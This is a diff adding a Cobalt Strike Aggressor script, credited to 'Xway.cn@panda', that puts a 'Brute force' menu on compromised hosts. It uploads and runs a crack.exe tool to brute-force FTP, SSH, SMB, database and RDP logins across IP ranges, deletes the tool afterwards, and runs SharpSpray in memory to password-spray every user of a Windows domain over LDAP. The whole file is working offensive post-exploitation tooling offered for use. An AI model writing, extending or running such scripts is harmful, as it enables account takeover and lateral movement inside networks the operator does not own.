@@ -1,0 +1,71 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+	    menu "Brute force" {
+			item "上传crack" {
+				$bid = $1;
+				$dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
+				drow_text($dialog, "UploadPath",  "Upload path: "); 	
+				dbutton_action($dialog, "Upload");
+				dialog_show($dialog);
+        }
+sub crack {
+
+    bcd($bid, $3['UploadPath']);
+
+        bupload($bid, script_resource("/script/crack.exe"));
+    }
+            item "Run crack"{
+                $bid = $1['@'];
+                $Dialog = dialog("Run crack",%(ip => "192.168.1.1/24，192.168.1-255，192.168.1.1", port => "3389", username => "filename list or username", password => "filename list or password", type => "ssh", thread => "Default thread 100",bid => $bid),&crack_run);
+                dialog_description($Dialog, "Support ftp，ssh，smb，mssql，mysql, postgresql,After blasting, result.txt will be generated in the current directory.");
+                drow_text($Dialog, "ip", "ip: ");
+                drow_text($Dialog, "port", "port: ");
+				drow_text($Dialog, "username", "username: ");
+				drow_text($Dialog, "password", "password: ");
+				drow_text($Dialog, "type", "type: ");
+				drow_text($Dialog, "thread", "thread: ");
+                dbutton_action($Dialog, "Run");
+                dialog_show($Dialog);
+                }
+
+sub crack_run{
+    local('$Name $port $username $password $type $thread');
+    $Name = $3['ip'];
+    $port = replace($3['port'], "\"", "");
+	$username = $3['username'];
+	$password = $3['password'];
+	$type = $3['type'];
+	$thread = $3['thread'];
+	bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
+}  
+        	item "Remove crack"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q crack.exe");
+        	}
+		}  
+
+			item "SharpSpray" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "15",bid => $bid), &SharpSpray);
+			dialog_description($dialog, "Use LDAP Perform a password spray attack on all users of the domain,Seeds specify several passwords to generate a dictionary, separated by commas,passwords Specify password blasting,Multiple passwords can be separated by commas,delay:Delay in password spray,Milliseconds,sleep:Between password guesses sleep Cycle minutes");
+			drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
+			drow_text($dialog, "passwd", "passwd:  ");
+			drow_text($dialog, "Delay", "Delay:  ");
+			drow_text($dialog, "Sleep", "Sleep:  ");
+            dbutton_action($dialog, "Run");
+			dialog_show($dialog);
+        }
+sub SharpSpray {
+	$arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
+	bexecute_assembly($bid, script_resource("/script/SharpSpray.exe"), $arg);
+}
+	  
+	  }
